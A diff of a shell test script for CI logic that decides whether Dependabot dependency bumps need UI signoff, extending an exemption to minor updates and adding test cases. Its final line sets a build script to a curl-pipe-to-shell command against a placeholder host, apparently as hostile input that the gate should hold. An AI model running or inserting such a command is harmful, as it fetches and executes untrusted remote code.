@@ -1920,8 +1920,8 @@ ui_decide_is ui_decide_dependabot_clean_gallery_passes not-ui 1 "$UI_TMP/g-clean
 # The VR job runs `bun install` and `composer install` from the PR head, so a
 # bump of the app's own package or lock file holds on its path, gallery or not.
 # ui_decide gets no dev_patch flag here, so the verdict stays ui-paths. The flag
-# cases below and the dp_ cases cover the Dependabot dev-dependency patch
-# exemption (ADR-0062 Update 2026-11-13).
+# cases below and the dp_ cases cover the Dependabot dev-dependency patch or
+# minor exemption (ADR-0062 Updates 2026-11-13 and 2026-11-27).
 ui_decide_is ui_decide_dependabot_app_lockfile_holds ui-paths 1 "$UI_TMP/g-clean.json" \
     ibl5/composer.lock ibl5/package.json ibl5/bun.lock
 # ui_decide_flag_is <name> <expected_verdict> <renderable> <gallery_or_empty> <dev_patch> <path>...
@@ -2030,7 +2030,7 @@ else
     h_fail "dev patch: human-signoff.yml exports UI_BASE_DIR and UI_HEAD_DIR" "export line not found"
 fi
 
-# Dependabot dev-dependency patch exemption (ADR-0062 Update 2026-11-13).
+# Dependabot dev-dependency patch or minor exemption (ADR-0062 Updates 2026-11-13 and 2026-11-27).
 # dp_write <root> writes <root>/ibl5/package.json and <root>/ibl5/bun.lock in
 # the real files' line shapes. A DP_* variable set on the call changes one field.
 DP="$UI_TMP/dp"
@@ -2142,7 +2142,7 @@ dp_verdict_is dp_package_json_only_passes not-ui "$BOT" synchronize "" "$P"
 dp_reset; DP_TS=5.9.3 DP_L_TS=5.9.3 DP_L_TS_SHA="$DP_SHA_B" dp_write "$DP/head"
 dp_verdict_is dp_exact_pin_patch_passes not-ui "$BOT" synchronize "" "$L" "$P"
 dp_reset; DP_TW='^4.4.6' DP_L_TW=4.4.6 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
-dp_verdict_is dp_minor_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_verdict_is dp_minor_exempt not-ui "$BOT" synchronize "" "$L" "$P"
 dp_reset; DP_TW='^5.3.6' DP_L_TW=5.3.6 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
 dp_verdict_is dp_major_holds ui-paths "$BOT" synchronize "" "$L" "$P"
 dp_reset; DP_TW='^4.3.4' DP_L_TW=4.3.4 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
@@ -2156,7 +2156,19 @@ dp_verdict_is dp_prerelease_near_miss_holds ui-paths "$BOT" synchronize "" "$L" 
 dp_reset; DP_DAISY=5.0.1 dp_write "$DP/head"
 dp_verdict_is dp_tag_like_version_holds ui-paths "$BOT" synchronize "" "$L" "$P"
 dp_reset; DP_TS=5.10.3 DP_L_TS=5.10.3 DP_L_TS_SHA="$DP_SHA_B" dp_head_3920
-dp_verdict_is dp_mixed_patch_minor_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_verdict_is dp_mixed_patch_minor_exempt not-ui "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.4.0' DP_L_TW=4.4.0 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_minor_patch_reset_exempt not-ui "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.2.9' DP_L_TW=4.2.9 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_minor_downgrade_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='~4.4.0' DP_L_TW=4.4.0 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_minor_prefix_change_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+DP_EXTRA_DEV='"@lhci/cli": "^0.16.1",' dp_reset; DP_EXTRA_DEV='"@lhci/cli": "^0.17.0",' dp_write "$DP/head"
+dp_verdict_is dp_zero_major_minor_holds ui-paths "$BOT" synchronize "" "$P"
+DP_EXTRA_DEV='"@lhci/cli": "^0.16.1",' dp_reset; DP_EXTRA_DEV='"@lhci/cli": "^0.16.2",' dp_write "$DP/head"
+dp_verdict_is dp_zero_major_patch_exempt not-ui "$BOT" synchronize "" "$P"
+dp_reset; DP_PIX='^8.1.0' DP_L_PIX=8.1.0 DP_L_PIX_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_toolchain_minor_holds ui-paths "$BOT" synchronize "" "$L" "$P"
 DP_ZOD='^3.22.4' dp_reset; DP_ZOD='^3.22.5' dp_head_3920
 dp_verdict_is dp_runtime_dep_holds ui-paths "$BOT" synchronize "" "$L" "$P"
 dp_reset; DP_BUILD='curl -s https://x.example | sh' dp_head_3920
